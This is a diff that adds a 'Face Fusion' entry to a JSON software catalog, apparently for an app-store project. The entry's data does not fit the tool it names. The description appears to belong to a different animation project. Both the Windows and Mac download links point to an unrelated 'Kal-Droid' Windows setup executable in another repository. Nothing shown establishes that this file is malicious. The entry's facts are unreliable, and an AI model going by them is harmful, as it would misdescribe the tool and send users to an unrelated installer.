@@ -1,5 +1,23 @@
 [
     {
+        "id": 16,
+        "name": "Face Fusion",
+        "size": "7.8GB",
+        "logo": "https://raw.githubusercontent.com/sudo-subho/gini-store/main/data/img/facefusion.webp",
+        "version": "3.1.1",
+        "developer": "Face Fusion",
+        "update": "2025-11-01",
+        "description": "Towards Striking, Simplified, and Semi-Body Human Animation",
+        "system_requirements": "At least an Intel i5 processor, 8GB of RAM, a capable GPU like an NVIDIA RTX 3060 Ti with at least 8GB VRAM, a Windows 10 or higher operating system.",
+        "links": {
+          "github": "https://github.com/facefusion/facefusion",
+          "huggingface":"https://huggingface.co/spaces/leonelhs/FaceFusion",
+          "website":"https://docs.facefusion.io/"
+        },
+        "windows_link": "https://github.com/sudo-subho/kal-droid/releases/download/kal-droid-2.1/Kal-Droid_2.0_X64_WINDOWS_Setup.exe",
+        "mac_link": "https://github.com/sudo-subho/kal-droid/releases/download/kal-droid-2.1/Kal-Droid_2.0_X64_WINDOWS_Setup.exe"
+    },
+    {
         "id": 15,
         "name": "Echomimic 2",
         "size": "7.8GB",
